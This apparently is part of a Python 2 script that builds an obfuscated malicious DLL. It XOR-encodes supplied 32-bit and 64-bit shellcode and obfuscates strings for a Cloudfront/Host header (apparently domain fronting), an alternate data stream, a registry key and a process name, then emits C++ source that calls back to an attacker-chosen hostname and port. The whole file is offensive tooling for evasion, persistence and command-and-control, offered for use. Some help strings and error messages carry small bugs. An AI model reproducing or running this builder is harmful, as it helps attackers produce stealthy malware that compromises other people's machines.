def formatCPP(data32, data64, key, hostname, port):
    shellcode32 = "\\x"
    shellcode32 += "\\x".join(format(ord(b),'02x') for b in data32)
    shellcode64 = "\\x"
    shellcode64 += "\\x".join(format(ord(b),'02x') for b in data64)
    Ob_Office = "strXOR(\""+ "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(Office), key)) + "\")"
    Ob_UserAgent = "(LPCWSTR)strXOR(\"" +  "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(UserAgent), key)) + "\")"
    Ob_Cloudfront = "(LPCWSTR)strXOR(\"" + "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(Cloudfront), key)) + "\")"
    Ob_Host = "(LPCWSTR)strXOR(\"" + "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(Host), key)) + "\")"
    Ob_ADS = "(LPCWSTR)strXOR(\"" + "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(ADS), key)) + "\")"
    Ob_RegKey = "(LPCSTR)strXOR(\"" + "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(RegKey), key)) + "\")"
    Ob_ProcessName = "strXOR(\""+ "\\x" +"\\x".join(format(ord(b),'02x') for b in xor(bytearray(ProcessName), key)) + "\")"
    result = convertFromTemplate({'shellcode32': shellcode32, 'shellcode64': shellcode64, 'key': key, 'hostname' : hostname ,'port' : port, 'Office' : Office, "UserAgent" : UserAgent, "Cloudfront" : Cloudfront, "Host" : Host, "ADS" : ADS, "RegKey" : RegKey, 'ProcessName' : ProcessName})

    if result != None:
        try:
            fileName = os.path.splitext(resultFiles['cpp'])[0] + "_" + os.path.splitext(resultFiles['cpp'])[1]
            with open(fileName,"w+") as f:
                f.write(result)
                f.close()
            print color("[+] C++ code file saved in [{}]".format(fileName))
        except IOError:
            print color("[!] Could not write C++ code  [{}]".format(fileName))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Create 32 bit and 64 bit DLL')
    parser.add_argument('-s', dest="shellcodeFile32", help="32 bit raw Shellcode file", required=True)
    parser.add_argument('-S', dest="shellcodeFile64", help="32 bit raw Shellcode file", required=True)
    parser.add_argument('-k', dest="key", help="One character key",required=True)
    parser.add_argument('-d', dest="hostname", help="Host name of the server", required=True)
    parser.add_argument('-p', dest="port", help="Port on the server", required=True)

    args = parser.parse_args()

    if not os.path.isdir("./result"):
        os.makedirs("./result")
        print color("[+] Creating [./result] directory for resulting dll")
    try:
		with open(args.shellcodeFile32) as shellcodeFileHandle:
			shellcodeBytes32 = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()
			print color("[*] Shellcode 32 ile [{}] successfully loaded".format(args.shellcodeFile32))
    except IOError:
        print color("[!] Could not open or read file [{}]".format(args.shellcodeFile))
        quit()
    try:
        with open(args.shellcodeFile64) as shellcodeFileHandle:
			shellcodeBytes64 = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()
			print color("[*] Shellcode 64 file [{}] successfully loaded".format(args.shellcodeFile32))
    except IOError:
        print color("[!] Could not open or read file [{}]".format(args.shellcodeFile))
        quit()
    masterKey = args.key
    hostname = args.hostname
    port = args.port
    transformedShellcode32 = xor_drop(shellcodeBytes32, masterKey)
    transformedShellcode64 = xor_drop(shellcodeBytes64, masterKey)
    print color("[*] Generating C++ code file")
    formatCPP(transformedShellcode32, transformedShellcode64, masterKey, hostname, port)
